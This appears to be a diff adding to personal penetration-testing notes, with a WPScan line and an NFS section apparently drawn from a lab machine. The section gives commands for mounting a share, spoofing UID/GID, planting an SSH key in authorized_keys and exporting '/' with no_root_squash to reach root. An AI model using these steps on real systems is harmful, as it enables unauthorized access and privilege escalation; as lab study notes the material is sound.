@@ -75,6 +75,68 @@ WPSCAN
 	wpscan --url <url>
 	
 WPSCAN enumerate users
+
 	-enumerate u
+	-e ap **uodate this later**
 	
-	-e ap
+---- NFS ports ----
+
+If NFS ports are open
+
+	showmount -e <ip>
+	<returns shared directories> e.g /home/vulnix
+
+Mounting the NFS directory
+
+		cd ~
+		mkdir vulnix
+		mount -t nfs <ip>:/home/vulnix ~/vulnix
+		
+View permissions and stuff of the new directory
+
+		ls -ld vulnix
+		<this may not show the UID and GID, showing as 'nobody'>
+		<e.g drwxr-x--- 2 nobody nobody 4096 Sep  2  2012 vulnix>
+		and/or
+		stat vulnix
+		
+Mount differently if cant see UID and GID
+
+		mount -t nfs -o vers=3 <ip>:/home/vulnix ~/vulnix
+		ls -ld vulnix
+		<should show the real UID and GID this time>
+		<e.g mount -t nfs -o vers=3 192.168.2.4:/home/vulnix ~/vulnix >
+		
+Create a spoof user
+
+		groupadd --gid 2008 vulnix_group
+		useradd --uid 2008 --groups vulnix_group vulnix_user
+		sudo -u vulnix_user ls -a vulnix
+		<if you have permissions now, it should show the file listing in the directory>
+		
+		
+**FIND OUT HOW TO GENERATE SSH KEYS AND PUT HERE **
+
+Copy own key into target's authorized keys
+
+		cp ~/.ssh/id_rsa.pub vulnix/.ssh/authorized_keys
+
+SSH into target
+
+		ssh vulnix@<ip>
+		
+** extras *8
+
+		cat /etc/exports
+		/home/vulnix	*(rw,root_squash)
+
+can add the following into /etc/exports to export the whole machine
+
+
+		/		*(rw,no_root_squash)
+		
+find a way to restart computer or service
+remount the thing
+spoof root uid and gid
+add new key again
+ssh in as root
